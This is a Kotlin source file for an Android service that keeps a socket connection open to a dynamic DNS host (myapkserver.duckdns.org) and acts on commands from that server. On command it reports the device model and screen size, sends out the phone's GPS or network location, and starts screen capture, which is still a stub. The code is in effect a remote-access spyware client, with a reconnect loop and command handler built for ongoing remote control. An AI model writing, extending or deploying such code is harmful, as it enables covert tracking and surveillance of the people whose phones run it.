package com.example.socketclient

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Point
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.location.LocationManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.*
import java.net.Socket
import java.net.SocketException
import kotlin.concurrent.thread

class SocketService : Service() {

    companion object {
        const val SERVER_IP = "myapkserver.duckdns.org"
        const val SERVER_PORT = 45655
        const val CHANNEL_ID = "SocketServiceChannel"
        const val NOTIFICATION_ID = 2
        private const val TAG = "SocketService"
    }

    private val DELIMITER = "\nJ\\."
    private var socket: Socket? = null
    @Volatile private var dataOut: DataOutputStream? = null

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjectionIntentData: Intent? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    @Volatile private var shouldRun = true

    override fun onCreate() {
        super.onCreate()
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        Log.d(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            Log.e(TAG, "Null intent received — stopping service safely")
            stopSelf()
            return START_NOT_STICKY
        }

        startForegroundServiceWithNotification()

        if (intent.hasExtra("mediaProjectionData")) {
            mediaProjectionIntentData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra("mediaProjectionData", Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("mediaProjectionData")
            }

            mediaProjectionIntentData?.let {
                try {
                    mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, it)
                    Log.d(TAG, "MediaProjection initialized from intent")
                } catch (t: Throwable) {
                    Log.e(TAG, "Failed to init MediaProjection", t)
                }
            }
        } else {
            Log.w(TAG, "No mediaProjectionData provided in intent")
        }

        shouldRun = true
        startConnectionThread()

        return START_STICKY
    }

    private fun startForegroundServiceWithNotification() {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Socket Service",
                NotificationManager.IMPORTANCE_LOW
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            else
                PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Socket Service Running")
            .setContentText("Listening for remote commands")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startConnectionThread() {
        thread {
            while (shouldRun) {
                try {
                    if (socket == null || socket?.isClosed == true) {
                        Log.d(TAG, "Attempting to connect to $SERVER_IP:$SERVER_PORT")
                        socket = Socket(SERVER_IP, SERVER_PORT)
                        socket?.soTimeout = 0
                        dataOut = DataOutputStream(BufferedOutputStream(socket!!.getOutputStream()))
                        Log.d(TAG, "Connected to server")
                        listenForCommands()
                    }
                } catch (se: SocketException) {
                    Log.e(TAG, "Socket exception while connecting/using socket", se)
                    safeCloseSocket()
                } catch (io: IOException) {
                    Log.e(TAG, "IO exception while connecting to server", io)
                    safeCloseSocket()
                } catch (t: Throwable) {
                    Log.e(TAG, "Unexpected error in connection thread", t)
                    safeCloseSocket()
                }

                if (shouldRun && (socket == null || socket?.isClosed == true)) {
                    try { Thread.sleep(2000) } catch (_: InterruptedException) {}
                }
            }
        }
    }

    private fun listenForCommands() {
        try {
            val input = socket?.getInputStream() ?: run { Log.e(TAG, "Input stream is null"); return }
            val reader = BufferedInputStream(input)
            val buffer = ByteArray(8192)
            val sb = StringBuilder()

            while (shouldRun && socket != null && socket!!.isConnected) {
                val length = try { reader.read(buffer) } catch (e: IOException) { Log.e(TAG, "Error reading input", e); -1 }

                if (length > 0) {
                    val part = String(buffer, 0, length)
                    sb.append(part)
                    var full = sb.toString()
                    if (full.contains(DELIMITER)) {
                        val pieces = full.split(DELIMITER)
                        val incomplete = if (!full.endsWith(DELIMITER)) pieces.last() else ""
                        val toProcess = if (incomplete.isEmpty()) pieces else pieces.dropLast(1)
                        for (p in toProcess) {
                            val cmd = p.trim()
                            if (cmd.isNotEmpty()) handleCommand(cmd)
                        }
                        sb.setLength(0)
                        sb.append(incomplete)
                    }
                } else if (length == -1) break
            }
        } catch (e: Throwable) {
            Log.e(TAG, "Error in listenForCommands", e)
        } finally {
            safeCloseSocket()
        }
    }

    private fun handleCommand(data: String) {
        try {
            val cmd = data.trim()
            when (cmd) {
                "~" -> sendData("~$DELIMITER${android.os.Build.MANUFACTURER}/${android.os.Build.MODEL}$DELIMITER")
                "!" -> {
                    val size = getScreenSize()
                    sendData("!$DELIMITER${size.first}$DELIMITER${size.second}$DELIMITER")
                }
                "LOC" -> fetchAndSendLocation()
                "@" -> startScreenCapture()
                "close" -> { sendData("CLOSING$DELIMITER"); stopSelf() }
                else -> sendData("ERR${DELIMITER}Unknown command:$cmd$DELIMITER")
            }
        } catch (e: Exception) {
            sendData("ERR${DELIMITER}Exception while handling command${DELIMITER}")
        }
    }

    private fun getScreenSize(): Pair<Int, Int> {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val metrics = wm.currentWindowMetrics
            Pair(metrics.bounds.width(), metrics.bounds.height())
        } else {
            @Suppress("DEPRECATION")
            val display = wm.defaultDisplay
            val size = Point()
            @Suppress("DEPRECATION")
            display.getRealSize(size)
            Pair(size.x, size.y)
        }
    }

    private fun fetchAndSendLocation() {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                val locGps: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                val locNet: Location? = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                val loc = locGps ?: locNet
                if (loc != null) sendData("LOC$DELIMITER${loc.latitude}$DELIMITER${loc.longitude}$DELIMITER")
                else sendData("LOC${DELIMITER}Location unavailable$DELIMITER")
            } else sendData("LOC${DELIMITER}Permission denied$DELIMITER")
        } catch (t: Throwable) {
            sendData("LOC${DELIMITER}Error fetching location: ${t.message}$DELIMITER")
        }
    }

    private fun startScreenCapture() {
        // Placeholder for your MediaProjection capture logic
        sendData("@${DELIMITER}Screen capture not implemented$DELIMITER")
    }

    @Synchronized
    private fun sendData(message: String) {
        try {
            if (dataOut != null) {
                val fullMessage = message + DELIMITER
                dataOut?.write(fullMessage.toByteArray(Charsets.UTF_8))
                dataOut?.flush()
                Log.d(TAG, "Sent: $fullMessage")
            } else {
                Log.e(TAG, "DataOutputStream is null, cannot send message")
            }
        } catch (e: IOException) {
            Log.e(TAG, "Error sending data: ${e.message}", e)
            safeCloseSocket()
        }
    }

    private fun safeCloseSocket() {
        try { dataOut?.close() } catch (e: Exception) { Log.e(TAG, "Error closing DataOutputStream: ${e.message}", e) }
        try { socket?.close() } catch (e: Exception) { Log.e(TAG, "Error closing socket: ${e.message}", e) }
        socket = null
        dataOut = null
        Log.d(TAG, "Socket and stream closed safely")
    }

    override fun onDestroy() {
        super.onDestroy()
        shouldRun = false
        try { mediaProjection?.stop() } catch (_: Exception) {}
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        safeCloseSocket()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
